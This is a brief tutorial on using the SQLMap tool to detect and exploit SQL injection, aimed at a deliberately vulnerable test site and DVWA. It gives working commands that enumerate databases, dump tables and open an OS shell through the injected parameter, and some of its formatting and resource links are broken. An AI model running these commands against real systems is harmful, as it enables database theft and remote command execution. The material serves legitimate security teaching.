
Finding Vulnerabilities using SQLMap
=====================================

<br>

# Introduction
---------------
> SQLMap is a popular open-source tool used for detecting and exploiting SQL injection vulnerabilities in web applications. This article will guide you through using SQLMap for educational purposes.

<br>

Prerequisites
----------------
- Basic understanding of SQL and web application security
- SQLMap installed on your system (Windows, Linux, macOS)
- A test environment or deliberately vulnerable web application (e.g., DVWA)
  
# Understanding SQL Injection
-----------------------------
> SQL injection occurs when an attacker injects malicious SQL code into a web application's database.
- Types of SQL Injection
- Classic SQL Injection
- Blind SQL Injection
- Time-Based Blind SQL Injection
- Boolean-Based Blind SQL Injection
  
# Using SQLMap
1. Basic Scan
```Bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1"
-u specifies the URL to scan
http://testphp.vulnweb.com/listproducts.php?cat=1 is the vulnerable URL
```
2. Identifying Vulnerable Parameters
```Bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php" --data "cat=1"
```
3. Enumerating Database Information
```Bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --banner
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --dbs
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --tables -D database_name
```
4. Dumping Database Contents
```Bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -D database_name -T table_name --dump
5. Exploiting Vulnerabilities
Bash
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --os-shell
```
Tips and Precautions
-----------------------
Obtain permission before testing
Use SQLMap in a controlled environment
Keep SQLMap updated
Conclusion
----------
SQLMap is a powerful tool for identifying SQL injection vulnerabilities.
Additional Resources
----------------------
SQLMap documentation: 
DVWA (Damn Vulnerable Web Application): 
